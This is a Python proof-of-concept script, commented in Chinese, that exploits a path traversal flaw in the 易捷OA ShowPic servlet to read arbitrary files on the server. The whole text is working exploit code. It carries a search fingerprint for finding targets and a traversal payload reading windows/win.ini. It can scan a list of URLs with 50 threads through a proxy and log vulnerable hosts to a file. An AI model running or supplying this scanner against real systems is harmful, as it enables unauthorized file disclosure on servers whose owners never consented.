#易捷OA协同办公软件 ShowPic 任意文件读取漏洞
#body="/images/logon/bg_img.jpg
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='ShowPic-任意文件读取')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(50)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        pass
def poc(target):
    payload="/servlet/ShowPic?filePath=../../windows/win.ini"
    data=''
    proxy={
        'http' :'http://127.0.0.1:7890',
        'https':'http://127.0.0.1:7890'
    }
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,timeout=20,verify=False,proxies=proxy)
        # print(res1.text)
        if '[fonts]' in res1.text:
            print(target+"存在任意文件读取漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__=='__main__':
    main()